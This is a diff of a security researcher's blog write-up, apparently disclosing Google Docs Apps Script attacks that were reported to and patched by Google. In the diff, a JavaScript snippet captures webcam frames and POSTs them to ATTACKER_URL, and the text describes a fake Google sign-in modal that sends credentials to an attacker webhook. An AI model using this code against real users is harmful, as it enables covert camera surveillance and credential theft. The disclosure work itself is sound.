+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">javascriptconst</span> <span style="color:#a6e22e">stream</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">mediaDevices</span>.<span style="color:#a6e22e">getUserMedia</span>({ <span style="color:#a6e22e">video</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">audio</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> });
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">video</span>.<span style="color:#a6e22e">srcObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">setInterval</span>(() =&gt; {
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">getContext</span>(<span style="color:#e6db74">&#39;2d&#39;</span>).<span style="color:#a6e22e">drawImage</span>(<span style="color:#a6e22e">video</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">320</span>, <span style="color:#ae81ff">240</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">drawImage</span>(<span style="color:#a6e22e">video</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">320</span>, <span style="color:#ae81ff">240</span>);
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">screenshot</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">toDataURL</span>(<span style="color:#e6db74">&#39;image/jpeg&#39;</span>, <span style="color:#ae81ff">0.7</span>);
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">ATTACKER_URL</span>, {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>({ <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">screenshot</span>, <span style="color:#a6e22e">time</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toISOString</span>() })
 </span></span><span style="display:flex;"><span>  });
-</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">5000</span>);
-</span></span></code></pre></div><p>Unfortunately, I did not record a video Proof of Concept for this specific camera exfiltration attack. However, I do have the actual captured image that the script successfully exfiltrated to my attacker controlled email address.</p>
+</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">15000</span>);
+</span></span></code></pre></div><p><strong>Why this is especially dangerous:</strong> The permission prompt appears inside a document the owner already trusts, on Google&rsquo;s own domain.There are no suspicious links, no spoofed websites, nothing that would normally raise a red flag.If the owner has previously granted camera permissions to Google Docs, no prompt appears at all.</p>
+<p>Unfortunately, I did not record a video Proof of Concept for this specific camera exfiltration. However, I do have the actual captured image that the script successfully exfiltrated to my attacker controlled email address.</p>
 <img src="/images/Im1.png" width="70%" alt="Proof of Concept Screenshot">
 <img src="/images/Im2.png" width="70%" alt="Proof of Concept Screenshot">
-<p><strong>Why this is especially dangerous:</strong> The camera permission prompt appears inside the document the owner already trusts, on Google&rsquo;s own domain. There are no suspicious links, no spoofed websites nothing that would normally raise a red flag.</p>
-<p><em>A few days after this was reported to Google, the image exfiltration stopped working, suggesting a server-side patch was applied.</em></p>
+<p><em>A few days after this was reported to Google, the image exfiltration stopped working, Google had patched it on their end</em></p>
 <hr>
 <h2 id="scenario-4--zero-click-credential-phishing">Scenario 4 — Zero-Click Credential Phishing
 </h2><p>Standard phishing requires a victim to click a suspicious link and ignore a wrong URL. This attack requires neither.</p>
-<p>The trigger renders a <strong>fake Google Sign-In modal</strong> directly inside the real document, on the real <code>docs.google.com</code> domain. Now, you might be thinking: <em>I would spot a fake login screen immediately.</em> And it is true that a highly vigilant user might notice something feels slightly &ldquo;off&rdquo; about the prompt. I am not saying every single person will fall for this trap every time.</p>
-<p>However, context is everything. Because you are safely navigating your own document on a legitimate Google URL, your guard is naturally down. When you are deep in the middle of working and a familiar looking &ldquo;session expired&rdquo; box pops up natively on the screen, it is incredibly easy to just type your password on autopilot. The owner, believing they simply need to re-authenticate, enters their credentials—which are silently sent to the attacker&rsquo;s webhook in real time.</p>
+<p>The trigger renders a <strong>fake Google Sign In modal</strong> directly inside the real document, on the real <code>docs.google.com</code> domain. Now, you might be thinking, <em>I would spot a fake login screen immediately.</em> And it is true that a highly vigilant user might notice something feels slightly &ldquo;off&rdquo; about the prompt. I am not saying every single person will fall for this trap every time. But if the attacker puts effort into making the UI look convincing, a regular user with no technical background can easily be fooled.</p>
 <p><strong>Trigger setup:</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">myFunction</span>() {
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">getProjectTriggers</span>().<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">trigger</span> =&gt; <span style="color:#a6e22e">ScriptApp</span>.<span style="color:#a6e22e">deleteTrigger</span>(<span style="color:#a6e22e">trigger</span>));
@@ -347,8 +443,7 @@ The script then captures photos of the owner every five seconds and sends them t
 <hr>
 <hr>
 <h3 id="final-thoughts--status">Final Thoughts &amp; Status
-</h3><p>Before I sign off, I want to mention that I am very much still a beginner in the web security field. I&rsquo;m taking things one step at a time, studying different architectures, and learning as I go.</p>
-<p>I stumbled upon this UI behavior during my research and thought it was an interesting edge case worth sharing. I have already reported this to Google, and it is currently undergoing further review by their team. I am still learning how to gauge exact impact levels, so whether this turns out to be a genuine issue or just a weird feature, I hope you found the write up interesting!</p>
+</h3><p>Before I sign off, I want to mention that I am very much still a beginner in the web security field. I&rsquo;m taking things one step at a time.Google acknowledged the issue and resolved it with a patch from their end.I hope you found the write up interesting!. Thank you</p>
 
 </section>
 
@@ -445,69 +540,29 @@ The script then captures photos of the owner every five seconds and sends them t
         </div>
         
 <script type="text/javascript" src="/ts/main.912f0c9ec652a1d0e86e5a301a9c5a015076a05980bebb86ecece1a3c05b6a26.js" defer></script>
-<div class="floating-tools">
-    <button id="toggle-reading" title="Reading Mode">
-        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
-            <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
-        </svg>
-    </button>
-    
-    <button id="toggle-snow" title="Snow">
-        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <polygon points="12 2 15 8 22 9 17 14 18 21 12 17 6 21 7 14 2 9 9 8 12 2"></polygon>
-        </svg>
-    </button>
-</div>
 
-<div id="snow-wrap" style="display: none;"></div>
-
-<script>
-    
-    document.addEventListener("DOMContentLoaded", function() {
-        
-        
-        const readingBtn = document.getElementById('toggle-reading');
-        if (readingBtn) {
-            readingBtn.addEventListener('click', () => {
-                document.body.classList.toggle('reading-mode');
-            });
-        }
-
-        
-        const snowBtn = document.getElementById('toggle-snow');
-        const snowWrap = document.getElementById('snow-wrap');
-        let snowActive = false;
-
-        if (snowBtn && snowWrap) {
-            snowBtn.addEventListener('click', () => {
-                snowActive = !snowActive;
-                snowWrap.style.display = snowActive ? 'block' : 'none';
-                
-                
-                if(snowActive && snowWrap.innerHTML === '') {
-                    for(let i = 0; i < 60; i++) {
-                        let flake = document.createElement('div');
-                        flake.className = 'snowflake';
-                        flake.innerHTML = '❅';
-                        
-                        
-                        flake.style.left = Math.random() * 100 + 'vw';
-                        
-                        flake.style.animationDuration = (Math.random() * 4 + 4) + 's'; 
-                        
-                        flake.style.animationDelay = (Math.random() * 5) + 's';
-                        
-                        flake.style.opacity = Math.random() * 0.8 + 0.2;
-                        flake.style.fontSize = (Math.random() * 12 + 10) + 'px';
-                        
-                        snowWrap.appendChild(flake);
-                    }
-                }
-            });
-        }
-    });
-</script>
 
     </body>
+
+    <div class="floating-tools">
+        <button id="toggle-reading" title="Reading Mode">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
+                <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
+            </svg>
+        </button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const readingBtn = document.getElementById('toggle-reading');
+            if (readingBtn) {
+                readingBtn.addEventListener('click', () => {
+                    document.body.classList.toggle('reading-mode');
+                });
+            }
+        });
+    </script>
+</body>
+
 </html>
